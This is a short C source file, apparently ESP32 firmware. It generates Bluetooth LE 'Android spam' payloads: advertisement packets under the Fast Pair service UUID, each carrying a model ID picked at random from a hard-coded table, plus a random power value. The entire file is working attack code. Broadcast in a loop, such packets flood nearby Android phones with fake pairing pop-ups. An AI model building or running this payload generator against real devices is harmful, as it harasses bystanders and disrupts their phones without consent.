// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.


#include "android_spam.h"
#include "esp_random.h"
#include <string.h>

typedef struct {
  uint32_t value;
} DeviceType;

static const DeviceType android_models[] = {
  {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, 
  {0x00000D}, {0x000007}, {0x000009}, {0x090000}, {0x000048}, 
  {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, 
  {0xF00002}, {0xF00400}, {0x1E89A7}, {0xCD8256}, {0x0000F0}, 
  {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, 
  {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, 
  {0x02F637}, {0x02D886}, {0xF00000}, {0xF00001}, {0xF00201}, 
  {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, 
  {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, 
  {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, 
  {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, 
  {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, 
  {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0xD99CA1}, 
  {0x77FF67}, {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, 
  {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F}, {0xB37A62}, 
  {0x92ADC9}
};
static const int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

int generate_android_payload(uint8_t *buffer, size_t max_len) {
  if (!buffer) return 0;

  uint32_t model = android_models[esp_random() % android_models_count].value;
  uint8_t packet[14] = {
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE,
    (uint8_t)((model >> 0x10) & 0xFF),
    (uint8_t)((model >> 0x08) & 0xFF),
    (uint8_t)((model >> 0x00) & 0xFF),
    0x02, 0x0A,
    (uint8_t)((esp_random() % 120) - 100)
  };
  if (max_len < 14) return 0;
  memcpy(buffer, packet, 14);
  return 14;
}
